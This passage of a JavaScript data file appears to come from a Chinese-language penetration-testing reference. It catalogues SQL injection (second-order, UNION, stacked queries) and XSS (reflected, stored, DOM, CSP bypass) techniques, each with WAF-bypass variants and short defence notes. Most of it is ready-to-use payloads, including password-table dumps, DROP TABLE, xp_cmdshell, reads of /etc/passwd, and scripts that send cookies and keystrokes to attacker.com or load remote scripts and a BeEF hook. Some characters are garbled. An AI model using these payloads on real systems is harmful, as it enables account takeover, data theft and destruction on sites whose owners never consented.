          { part: '输入邮箱: \' OR \'1\'=\'1', explanation: '利用载荷', type: 'value' },
          { part: '输入邮箱:', explanation: '关键参数', type: 'value' },
          { part: 'OR', explanation: '关键参数', type: 'value' },
          { part: '\'1\'', explanation: '关键参数', type: 'value' }
        ]
      },
      { 
        title: '4. 订单/评论注入', 
        command: `提交评论: ' UNION SELECT username,password FROM users--
管理员查看评论时触发`,
        description: '评论触发注入', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'UNION', explanation: '合并查询结果集', type: 'keyword' },
          { part: 'SELECT', explanation: '查询数据', type: 'keyword' },
          { part: 'FROM users', explanation: '指定数据表', type: 'value' },
          { part: '--', explanation: 'SQL单行注释', type: 'operator' }
        ]
      }
    ],
    wafBypass: [
      { 
        title: '编码存储触发绕过', 
        command: `注册用户名: admin'/*
随后修改密码时SQL变为: UPDATE users SET password='new' WHERE username='admin'/*'

注册用户名: CONCAT(CHAR(39),CHAR(32),CHAR(79),CHAR(82),CHAR(32),CHAR(39),CHAR(49),CHAR(39),CHAR(61),CHAR(39),CHAR(49))
存储后二次使用时自动解码触发注入`, 
        description: '在存储阶段使用注释截断(/**/)或CHAR()编码构造payload，WAF在输入时检测不到恶意SQL，但数据库二次使用时自动触发', 
        syntaxBreakdown: [
          { part: 'WHERE', explanation: '条件过滤', type: 'keyword' },
          { part: 'CONCAT', explanation: '字符串拼接函数', type: 'function' }
        ]
      },
      { 
        title: 'Unicode标准化绕过', 
        command: `注册用户名: admin＇ OR ＇1＇=＇1
(使用全角引号U+FF07，数据库标准化为半角后触发)

注册邮箱: test@test.com' UNION SELECT password FROM users WHERE '1'='1
(邮箱验证通过WAF但存储后在其他查询中拼接触发)

评论内容: \\x27 OR 1=1--
(转义序列在存储层被还原为单引号)`, 
        description: '利用Unicode全角字符(U+FF07)标准化、转义序列还原、不同功能模块的过滤差异来绕过WAF检测', 
        syntaxBreakdown: [
          { part: '＇(U+FF07)', explanation: '全角单引号，部分数据库标准化后变为ASCII单引号' },
          { part: '\\x27', explanation: '十六进制转义序列，某些场景下被还原为单引号' }
        ]
      }
    ],
    tutorial: {
      overview: 'SQL二次注入是指恶意输入在首次存储时被正确转义，但在后续查询中未经转义直接使用，导致注入触发。这种漏洞因为输入和触发分离，极难被自动化工具发现。',
      vulnerability: 'SQL二次注入的根因在于：开发者在数据写入时使用了参数化查询或转义处理，但在读取并再次使用这些数据时却直接拼接进SQL语句中。典型场景包括用户注册时存储恶意用户名，在修改密码时触发注入。',
      exploitation: '二次注入利用步骤：1)注册包含SQL payload的用户名(如admin\'-- ) 2)正常登录该账号 3)触发使用该用户名的功能(如修改密码) 4)后台SQL拼接了未转义的用户名导致注入触发 5)通过该注入窃取或修改其他用户数据。',
      mitigation: '防御二次注入：对所有数据在每次使用时都执行参数化查询，不仅在写入时，在读取后再次使用时也必须参数化。建立安全编码规范：任何来自数据库的数据都应视为不可信输入。',
      difficulty: 'advanced'
    }
  },
  {
    id: 'sqli-union',
    name: '联合查询注入',
    description: '使用UNION SELECT提取数据',
    category: 'SQL/NoSQL注入',
    subCategory: '联合查询',
    tags: ['sqli', 'union', 'select'],
    prerequisites: ['存在注入点', '可显示查询结果'],
    execution: [
      { 
        title: '1. 确定列数', 
        command: `' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
�到报错
或:
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--`, 
        description: '确定列数', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'ORDER BY', explanation: '按列排序确定列数' },
          { part: 'NULL,NULL', explanation: '逐个增加NULL确定列数' }
        ]
      },
      { 
        title: '2. 确定显示列', 
        command: `' UNION SELECT 1,2,3--
' UNION SELECT 'a','b','c'--
找出哪些列会显示在页面上`,
        description: '确定显示位置', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'UNION', explanation: '关键参数', type: 'value' },
          { part: 'SELECT', explanation: '关键参数', type: 'value' },
          { part: '1,2,3--', explanation: '关键参数', type: 'value' }
        ]
      },
      { 
        title: '3. 提取数据', 
        command: `' UNION SELECT username,password,3 FROM users--
' UNION SELECT table_name,2,3 FROM information_schema.tables--`,
        description: '提取数据', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'UNION', explanation: '合并查询结果集', type: 'keyword' },
          { part: 'SELECT', explanation: '查询数据', type: 'keyword' },
          { part: 'FROM users', explanation: '指定数据表', type: 'value' },
          { part: '--', explanation: 'SQL单行注释', type: 'operator' }
        ]
      },
      { 
        title: '4. 绕过过滤', 
        command: `' /*!UNION*/ /*!SELECT*/ 1,2,3--
' UnIoN SeLeCt 1,2,3--
' UNION/**/SELECT/**/1,2,3--`,
        description: '绕过关键字过滤', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '\' /*!UNION*/ /*!SELECT*/ 1,2,3', explanation: '绕过技术', type: 'technique' },
          { part: '/*!UNION*/', explanation: '关键参数', type: 'value' },
          { part: '/*!SELECT*/', explanation: '关键参数', type: 'value' },
          { part: '1,2,3--', explanation: '关键参数', type: 'value' }
        ]
      }
    ],
    wafBypass: [
      { 
        title: 'UNION注入关键字绕过', 
        command: `' /*!50000UNION*/ /*!50000SELECT*/ 1,database(),3--
' %55%4e%49%4f%4e %53%45%4c%45%43%54 1,2,3--
' uNiOn%23%0aSeLeCt 1,2,3--
' UNION%0a%09%0d%0bSELECT%0a1,2,3--`, 
        description: '使用MySQL版本注释/*!50000*/、URL编码UNION/SELECT关键字、%23换行绕过、空白字符混淆（%09 TAB, %0d CR, %0b VT）', 
        syntaxBreakdown: [
          { part: '/*!50000UNION*/', explanation: 'MySQL 5.0以上版本执行注释内SQL' },
          { part: '%55%4e%49%4f%4e', explanation: 'URL编码的UNION绕过关键字检测' },
          { part: '%23%0a', explanation: '#注释+换行绕过单行检测规则' }
        ]
      },
      { 
        title: 'UNION注入NULL字节与分块绕过', 
        command: `' UNION%00SELECT 1,2,3--
' /*!UNION*/%20/*!ALL*//*!SELECT*/ 1,2,3--
Transfer-Encoding: chunked

5
UNION
7
 SELECT
1
 
0

' UNION SELECT 1,group_concat(table_name SEPARATOR 0x3c62723e),3 FROM information_schema.tables WHERE table_schema=database()--`, 
        description: '使用NULL字节(%00)截断WAF检测、UNION ALL绕过去重检测、HTTP分块传输编码将关键字分散到不同chunk、自定义SEPARATOR替代默认逗号', 
        syntaxBreakdown: [
          { part: '%00', explanation: 'NULL字节，部分WAF遇到后停止检测' },
          { part: 'UNION ALL', explanation: '不去重的联合查询，某些WAF只过滤UNION SELECT' },
          { part: 'Transfer-Encoding: chunked', explanation: '分块传输将payload分散绕过WAF' }
        ]
      }
    ],
    tutorial: {
      overview: 'UNION联合查询注入通过UNION SELECT将攻击者的查询结果与原始查询合并输出，是数据提取效率最高的注入方式，可一次性获取整行整列的数据。',
      vulnerability: 'UNION注入要求攻击者的SELECT子句与原始查询有相同的列数和兼容的数据类型。漏洞利用前需先确定列数(ORDER BY递增法或UNION SELECT NULL法)，再逐步替换NULL为目标字段提取数据库名、表名、列名及数据。',
      exploitation: 'UNION注入步骤：1)ORDER BY N确定列数 2)UNION SELECT NULL,...找到回显位 3)替换回显位为version()/database() 4)查询information_schema获取表名和列名 5)UNION SELECT提取目标数据(用户名、密码哈希等)。',
      mitigation: '防御UNION注入：使用参数化查询(最有效)，部署WAF检测UNION SELECT关键词组合，限制查询返回的列数和行数，对information_schema的访问权限进行限制，最小化数据库用户权限。',
      difficulty: 'beginner'
    }
  },
  {
    id: 'sqli-stacked',
    name: '堆叠查询注入',
    description: '执行多条SQL语句的注入',
    category: 'SQL/NoSQL注入',
    subCategory: '堆叠查询',
    tags: ['sqli', 'stacked', 'queries'],
    prerequisites: ['支持多语句执行', 'MySQL/PostgreSQL/MSSQL'],
    execution: [
      { 
        title: '1. 探测堆叠查询', 
        command: `'; SELECT SLEEP(5)--
'; SELECT 1--
'; WAITFOR DELAY '0:0:5'--`,
        description: '探测是否支持堆叠查询', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '\'; SELECT SLEEP(5)--', explanation: '探测载荷', type: 'value' },
          { part: '\';', explanation: '关键参数', type: 'value' },
          { part: 'SELECT', explanation: '关键参数', type: 'value' },
          { part: 'SLEEP(5)--', explanation: '关键参数', type: 'value' }
        ]
      },
      { 
        title: '2. MySQL堆叠查询', 
        command: `'; INSERT INTO users(username,password) VALUES('hacker','hacked');--
'; UPDATE users SET password='hacked' WHERE username='admin';--
'; DROP TABLE users;--`, 
        description: 'MySQL执行多语句', 
        platform: 'linux',
        syntaxBreakdown: [
          { part: ';', explanation: '语句分隔符' },
          { part: 'INSERT INTO', explanation: '插入数据' }
        ]
      },
      { 
        title: '3. MSSQL堆叠查询', 
        command: `'; EXEC xp_cmdshell('whoami');--
'; EXEC sp_executesql N'SELECT * FROM users';--`,
        description: 'MSSQL执行命令', 
        platform: 'windows',
        syntaxBreakdown: [
          { part: 'SELECT', explanation: '查询数据', type: 'keyword' },
          { part: 'FROM users', explanation: '指定数据表', type: 'value' },
          { part: '--', explanation: 'SQL单行注释', type: 'operator' }
        ]
      },
      { 
        title: '4. PostgreSQL堆叠查询', 
        command: `'; COPY users FROM '/etc/passwd';--
'; SELECT * FROM pg_read_file('/etc/passwd');--`,
        description: 'PostgreSQL读取文件', 
        platform: 'linux',
        syntaxBreakdown: [
          { part: 'SELECT', explanation: '查询数据', type: 'keyword' },
          { part: 'FROM pg_read_file', explanation: '指定数据表', type: 'value' },
          { part: '--', explanation: 'SQL单行注释', type: 'operator' }
        ]
      }
    ],
    wafBypass: [
      { 
        title: '堆叠查询终止符替代绕过', 
        command: `' %3B SELECT user()--
' ;%0a SELECT user()--
' ; /*!SELECT*/ user()--
'; SET @q=0x53454C45435420757365722829; PREPARE stmt FROM @q; EXECUTE stmt;--`, 
        description: '使用URL编码分号(%3B)、换行符分隔、内联注释包裹SELECT、PREPARE预处理执行十六进制编码的查询语句', 
        syntaxBreakdown: [
          { part: '%3B', explanation: 'URL编码的分号绕过分号检测' },
          { part: 'PREPARE/EXECUTE', explanation: '预处理语句执行十六进制编码的SQL' },
          { part: '0x53454C...', explanation: '"SELECT user()"的十六进制编码' }
        ]
      },
      { 
        title: '堆叠查询条件执行绕过', 
        command: `'; IF(1=1) EXEC('wh'+'oam'+'i');--
'; DECLARE @s VARCHAR(100)=CHAR(119)+CHAR(104)+CHAR(111)+CHAR(97)+CHAR(109)+CHAR(105); EXEC xp_cmdshell @s;--
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) END;--
'; DO $$ BEGIN PERFORM dblink_connect('host=attacker.com dbname=test'); END $$;--`, 
        description: '使用字符串拼接分割命令关键字、CHAR()编码命令参数、CASE条件执行、PostgreSQL DO块执行复杂逻辑', 
      }
    ],
    tutorial: {
      overview: 'SQL堆叠查询注入通过分号(;)分隔多条SQL语句，可在一次请求中执行INSERT/UPDATE/DELETE甚至创建存储过程，危害远超普通SELECT注入。',
      vulnerability: 'SQL堆叠查询在MSSQL和PostgreSQL中默认支持，MySQL在PHP的mysqli_multi_query()下才支持。该漏洞可执行任意DML/DDL操作：插入管理员账户、修改密码、删除数据、创建后门存储过程甚至执行系统命令。',
      exploitation: '堆叠注入利用：1)确认目标支持堆叠查询(;SELECT SLEEP(2)) 2)执行INSERT添加管理员账号 3)执行UPDATE修改现有账户密码 4)MSSQL环境下启用并调用xp_cmdshell执行系统命令 5)PostgreSQL下通过COPY TO写文件。',
      mitigation: '防御堆叠查询注入：使用参数化查询，数据库连接配置禁用多语句执行，限制数据库账户权限(禁止CREATE/DROP/ALTER)，WAF检测分号分隔的多语句模式，定期审计数据库操作日志。',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'xss-reflected',
    name: '反射型XSS',
    description: '反射型跨站脚本攻击技术',
    category: 'XSS跨站脚本',
    subCategory: '反射型',
    tags: ['xss', 'reflected', 'javascript'],
    prerequisites: ['存在用户输入反射到页面', '输入未经过滤或编码'],
    execution: [
      { 
        title: '1. 探测XSS注入点', 
        command: '<script>alert(1)</script>\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n" onfocus=alert(1) autofocus "', 
        description: '基础XSS探测', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '<script>', explanation: 'HTML script标签' },
          { part: 'alert(1)', explanation: 'JavaScript弹窗函数' },
          { part: 'onerror', explanation: '图片加载错误事件' },
          { part: 'onload', explanation: '元�加载完成事件' }
        ]
      },
      { 
        title: '2. 事件处理器绕过', 
        command: '<img src=x onerror=alert(1)>\n<body onload=alert(1)>\n<input onfocus=alert(1) autofocus>\n<marquee onstart=alert(1)>\n<video><source onerror=alert(1)>\n<audio src=x onerror=alert(1)>', 
        description: '使用各种事件处理器', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'onerror', explanation: '错误事件' },
          { part: 'onload', explanation: '加载事件' },
          { part: 'onfocus', explanation: '获取焦点事件' },
          { part: 'onstart', explanation: '开始事件' }
        ]
      },
      { 
        title: '3. 标签绕过', 
        command: '<ScRiPt>alert(1)</ScRiPt>\n<IMG SRC=x OnErRoR=alert(1)>\n<svg/onload=alert(1)>\n<details/open/ontoggle=alert(1)>', 
        description: '大小写混淆和标签变形', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'ScRiPt', explanation: '大小写混合绕过' },
          { part: 'svg/onload', explanation: '使用斜杠代替空格' }
        ]
      },
      { 
        title: '4. 窃取Cookie', 
        command: '<script>new Image().src="http://attacker.com/steal?c="+document.cookie</script>\n<script>fetch("http://attacker.com/steal?c="+document.cookie)</script>\n<script>location="http://attacker.com/steal?c="+document.cookie</script>', 
        description: '窃取用户Cookie', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'document.cookie', explanation: '获取当前页面Cookie' },
          { part: 'new Image().src', explanation: '创建图片对象发送请求' },
          { part: 'fetch()', explanation: '使用Fetch API发送请求' }
        ]
      },
      { 
        title: '5. 键盘记录', 
        command: '<script>\ndocument.onkeypress=function(e){\n  fetch("http://attacker.com/log?key="+e.key)\n}\n</script>', 
        description: '记录用户键盘输入', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'onkeypress', explanation: '键盘按下事件' },
          { part: 'e.key', explanation: '按下的键值' }
        ]
      }
    ],
    wafBypass: [
      { 
        title: 'HTML实体编码', 
        command: '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>\n<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>', 
        description: '使用HTML实体编码绕过', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '&#97;', explanation: 'a的十进制HTML实体' },
          { part: '&#x61;', explanation: 'a的十六进制HTML实体' }
        ]
      },
      { 
        title: 'Unicode编码', 
        command: '<script>\\u0061lert(1)</script>\n<img src=x onerror=\\u0061lert(1)>', 
        description: '使用Unicode编码绕过', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '\\u0061', explanation: 'a的Unicode编码' }
        ]
      },
      { 
        title: '双写绕过', 
        command: '<scr<script>ipt>alert(1)</scr</script>ipt>\n<imimgg src=x onerror=alert(1)>',
            syntaxBreakdown: [
              { part: '<scr<script>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: 'ipt>alert(1)', explanation: '注入代码', type: 'value' },
              { part: '</scr</script>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: 'ipt>\n', explanation: '注入代码', type: 'value' },
              { part: '<imimgg src=x onerror=alert(1)>', explanation: 'HTML标签/事件处理器', type: 'tag' }
            ],
        description: '双写绕过关键字删除', 
        platform: 'all'
      },
      { 
        title: '注释混淆', 
        command: '<script>/**/alert(1)/**/</script>\n<img src=x/**/onerror=alert(1)>\n<svg on<!--test-->load=alert(1)>',
            syntaxBreakdown: [
              { part: '<script>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '/**/alert(1)/**/', explanation: '注入代码', type: 'value' },
              { part: '</script>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '\n', explanation: '注入代码', type: 'value' },
              { part: '<img src=x/**/onerror=alert(1)>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '\n', explanation: '注入代码', type: 'value' },
              { part: '<svg on<!--test-->', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: 'load=alert(1)>', explanation: '注入代码', type: 'value' }
            ],
        description: '使用注释混淆', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'XSS反射型跨站脚本攻击是最常见的XSS类型，恶意脚本通过URL参数传递给服务器后直接回显在响应页面中，需要诱导受害者点击恶意链接才能触发执行。',
      vulnerability: '反射型XSS漏洞发生在服务器将用户输入(URL参数、表单字段、HTTP头)未经转义直接嵌入HTML响应中。常见触发点包括搜索结果页、错误页面、404页面中回显用户输入的位置。',
      exploitation: '完�利用流程：\n1. 探测XSS注入点\n2. 绕过过滤机制\n3. 构造恶意payload\n4. 诱使受害者点击链接\n5. 窃取Cookie或执行恶意操作',
      mitigation: '防御措施：\n1. 对所有用户输入进行HTML实体编码\n2. 使用CSP (Content-Security-Policy)\n3. 设置HttpOnly Cookie标志\n4. 输入验证和白名单过滤',
      difficulty: 'beginner'
    }
  },
  {
    id: 'xss-stored',
    name: '存储型XSS',
    description: '存储型跨站脚本攻击技术',
    category: 'XSS跨站脚本',
    subCategory: '存储型',
    tags: ['xss', 'stored', 'persistent'],
    prerequisites: ['存在数据存储功能', '存储数据未经过滤显示'],
    execution: [
      { 
        title: '1. 探测存储点', 
        command: '在评论区、用户名、个人简介等处输入:\n<script>alert(1)</script>\n"><script>alert(1)</script>\n测试是否存储并执行',
            syntaxBreakdown: [
              { part: '在评论区、用户名、个人简介等处输入:\n', explanation: '注入代码', type: 'value' },
              { part: '<script>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: 'alert(1)', explanation: '注入代码', type: 'value' },
              { part: '</script>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '\n">', explanation: '注入代码', type: 'value' },
              { part: '<script>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: 'alert(1)', explanation: '注入代码', type: 'value' },
              { part: '</script>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '\n测试是否存储并执行', explanation: '注入代码', type: 'value' }
            ],
        description: '探测存储型XSS', 
        platform: 'all'
      },
      { 
        title: '2. 隐蔽Payload', 
        command: '<img src=x onerror=alert(1) style="display:none">\n<svg/onload=alert(1) style="position:absolute;left:-9999px">\n<div style="background:url(javascript:alert(1))">', 
        description: '使用隐蔽的XSS payload', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'style="display:none"', explanation: '隐藏元�' },
          { part: 'position:absolute;left:-9999px', explanation: '移出可视区域' }
        ]
      },
      { 
        title: '3. 持久化控制', 
        command: '<script>\nif(!window.xss_loaded){\n  window.xss_loaded=true;\n  var s=document.createElement("script");\n  s.src="http://attacker.com/evil.js";\n  document.body.appendChild(s);\n}\n</script>', 
        description: '加载外部恶意脚本', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'createElement', explanation: '创建DOM元�' },
          { part: 'appendChild', explanation: '添加到DOM树' }
        ]
      },
      { 
        title: '4. BeEF Hook', 
        command: '<script src="http://beef-server:3000/hook.js"></script>\n或:\n<script>\nvar s=document.createElement("script");\ns.src="http://beef-server:3000/hook.js";\ndocument.body.appendChild(s);\n</script>',
            syntaxBreakdown: [
              { part: '<script src="http://beef-server:3000/hook.js">', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '</script>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '\n或:\n', explanation: '注入代码', type: 'value' },
              { part: '<script>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '\nvar s=document.createElement("script");\ns.src="http://beef-server:3000/hook.js";\ndocument.body.appendChild(s);\n', explanation: '注入代码', type: 'value' },
              { part: '</script>', explanation: 'HTML标签/事件处理器', type: 'tag' }
            ],
        description: '使用BeEF框架控制浏览器', 
        },
      ],
    wafBypass: [
      { 
        title: 'SVG标签绕过', 
        command: '<svg><script>alert(1)</script></svg>\n<svg><animate onbegin=alert(1)>\n<svg><set onbegin=alert(1)>',
            syntaxBreakdown: [
              { part: '<svg>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '<script>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: 'alert(1)', explanation: '注入代码', type: 'value' },
              { part: '</script>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '</svg>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '\n', explanation: '注入代码', type: 'value' },
              { part: '<svg>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '<animate onbegin=alert(1)>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '\n', explanation: '注入代码', type: 'value' },
              { part: '<svg>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '<set onbegin=alert(1)>', explanation: 'HTML标签/事件处理器', type: 'tag' }
            ],
        description: '使用SVG标签绕过', 
        platform: 'all'
      },
      { 
        title: 'Math标签绕过', 
        command: '<math><maction actiontype="statusline#http://attacker.com" xlink:href="javascript:alert(1)">click</maction></math>',
            syntaxBreakdown: [
              { part: '<math>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '<maction actiontype="statusline#http://attacker.com" xlink:href="javascript:alert(1)">', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: 'click', explanation: '注入代码', type: 'value' },
              { part: '</maction>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '</math>', explanation: 'HTML标签/事件处理器', type: 'tag' }
            ],
        description: '使用MathML标签', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: '存储型XSS是危害最大的XSS类型，恶意脚本被永久存储在目标服务器(数据库/文件)中。每个访问受感染页面的用户都会自动执行恶意代码，无需用户点击特殊链接。',
      vulnerability: '存储型XSS的触发点包括：用户评论/留言板、个人资料(用户名/签名/头像URL)、论坛帖子、即时消息、文件名、日志查看器等任何存储后会被其他用户浏览的内容。漏洞根因是存储时和显示时均未进行安全处理。',
      exploitation: '完�利用流程：\n1. 找到数据存储点\n2. 注入恶意脚本\n3. 等待其他用户访问\n4. 自动执行恶意操作',
      mitigation: '防御措施：\n1. 存储前进行HTML编码\n2. 输出时进行上下文编码\n3. 使用CSP策略\n4. 定期扫描存储内容',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'xss-dom',
    name: 'DOM型XSS',
    description: '基于DOM的跨站脚本攻击',
    category: 'XSS跨站脚本',
    subCategory: 'DOM型',
    tags: ['xss', 'dom', 'javascript'],
    prerequisites: ['存在JavaScript动态操作DOM', '用户输入�接写入DOM'],
    execution: [
      {
        title: '1. 探测DOM XSS',
        command: `#<script>alert(1)</script>
?param=<img src=x onerror=alert(1)>
检查location.hash、location.search等是否�接写入DOM`,
        description: '探测DOM型XSS',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'location.hash', explanation: 'URL中#后面的部分', type: 'value' },
          { part: 'location.search', explanation: 'URL中?后面的查询字符串', type: 'value' },
        ]
      },
      {
        title: '2. 常见Sink点',
        command: `document.write(location.hash)
innerHTML = location.search
eval(location.hash)
setTimeout(location.hash, 0)
jQuery(html)
$(location.hash)`,
        description: '常见的DOM XSS Sink点',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'document.write', explanation: '�接写入HTML', type: 'value' },
          { part: 'innerHTML', explanation: '设置元�HTML内容', type: 'value' },
          { part: 'eval()', explanation: '执行JavaScript代码', type: 'value' },
        ]
      },
      {
        title: '3. location.hash利用',
        command: `URL: http://target.com/#<img src=x onerror=alert(1)>
如果页面有: document.write(location.hash)
则触发XSS`,
            syntaxBreakdown: [
              { part: 'URL: http://target.com/#', explanation: '注入代码', type: 'value' },
              { part: '<img src=x onerror=alert(1)>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '\n如果页面有: document.write(location.hash)\n则触发XSS', explanation: '注入代码', type: 'value' }
            ],
        description: '利用location.hash',
        platform: 'all',
      },
      {
        title: '4. postMessage利用',
        command: `window.addEventListener("message", function(e){
  document.getElementById("output").innerHTML = e.data;
});
攻击页面:
targetWindow.postMessage("<img src=x onerror=alert(1)>", "*");`,
        description: '利用postMessage',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'postMessage', explanation: '跨窗口消息传递', type: 'value' },
          { part: 'e.data', explanation: '接收到的消息数据', type: 'value' },
        ]
      },
    ],
    wafBypass: [
      {
        title: 'javascript:协议变体绕过',
        command: `javascript:alert(1)
javascript	:alert(1)
jaVaScRiPt:alert(1)
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)
<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)">click</a>`,
            syntaxBreakdown: [
              { part: 'javascript:alert(1)\njavascript	:alert(1)\njaVaScRiPt:alert(1)\n&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)\n', explanation: '注入代码', type: 'value' },
              { part: '<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)">', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: 'click', explanation: '注入代码', type: 'value' },
              { part: '</a>', explanation: 'HTML标签/事件处理器', type: 'tag' }
            ],
        description: '使用大小写混淆、HTML实体编码、制表符插入等方式绕过javascript:协议过滤',
      },
      {
        title: 'SVG/MathML标签与事件处理器绕过',
        command: `<svg onload=alert(1)>
<svg/onload=alert(1)>
<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">
<details open ontoggle=alert(1)>
<body onpageshow=alert(1)>
<input onfocus=alert(1) autofocus>`,
            syntaxBreakdown: [
              { part: '<svg onload=alert(1)>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '<svg/onload=alert(1)>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '<math>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '<mtext>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '<table>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '<mglyph>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '<svg>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '<mtext>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '<textarea>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '<path id="</textarea>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '<img onerror=alert(1) src=1>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '">\n', explanation: '注入代码', type: 'value' },
              { part: '<details open ontoggle=alert(1)>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '<body onpageshow=alert(1)>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '<input onfocus=alert(1) autofocus>', explanation: 'HTML标签/事件处理器', type: 'tag' }
            ],
        description: '利用SVG、MathML等非标准HTML标签及冷门事件处理器(ontoggle、onpageshow)绕过标签和事件黑名单',
      },
    ],
    tutorial: {
      overview: 'DOM型XSS完全在客户端执行，恶意脚本不经过服务器处理。攻击者通过操纵DOM环境(如URL片段、document.referrer)使页面JavaScript读取并不安全地写入恶意内容。',
      vulnerability: 'DOM型XSS的source(输入源)包括location.hash、location.search、document.referrer、postMessage等，sink(危险函数)包括innerHTML、document.write、eval、setTimeout等。当source数据未经净化直接传递给sink时触发漏洞。',
      exploitation: '完�利用流程：\n1. 分析JavaScript代码找到Sink点\n2. 构造恶意URL\n3. 诱使受害者访问\n4. 浏览器执行恶意脚本',
      mitigation: '防御措施：\n1. 使用textContent代替innerHTML\n2. 对DOM操作进行编码\n3. 使用安全的框架API\n4. 启用CSP策略',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'xss-csp-bypass',
    name: 'CSP绕过',
    description: '绕过内容安全策略(CSP)的XSS技术',
    category: 'XSS跨站脚本',
    subCategory: 'CSP绕过',
    tags: ['xss', 'csp', 'bypass'],
    prerequisites: ['存在XSS漏�', '存在CSP策略但配置不当'],
    execution: [
      {
        title: '1. 分析CSP策略',
        command: `查看HTTP响应�:
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com
或使用CSP Evaluator工具分析`,
        description: '分析CSP配置',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'https://cdn.example.com', explanation: '目标URL', type: 'value' },
          { part: '查看HTTP响应�:', explanation: '关键参数', type: 'value' }
        ]
      },
      {
        title: '2. 利用unsafe-inline',
        command: `如果CSP包含unsafe-inline:
<script>alert(1)</script>
可以�接执行内联脚本`,
            syntaxBreakdown: [
              { part: '如果CSP包含unsafe-inline:\n', explanation: '注入代码', type: 'value' },
              { part: '<script>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: 'alert(1)', explanation: '注入代码', type: 'value' },
              { part: '</script>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '\n可以�接执行内联脚本', explanation: '注入代码', type: 'value' }
            ],
        description: '利用unsafe-inline配置',
        platform: 'all',
      },
      {
        title: '3. 利用unsafe-eval',
        command: `如果CSP包含unsafe-eval:
<script>eval("alert(1)")</script>
<script>setTimeout("alert(1)", 0)</script>
可以使用eval等函数`,
            syntaxBreakdown: [
              { part: '如果CSP包含unsafe-eval:\n', explanation: '注入代码', type: 'value' },
              { part: '<script>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: 'eval("alert(1)")', explanation: '注入代码', type: 'value' },
              { part: '</script>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '<script>', explanation: 'HTML标签/事件处理器', type: 'tag' },
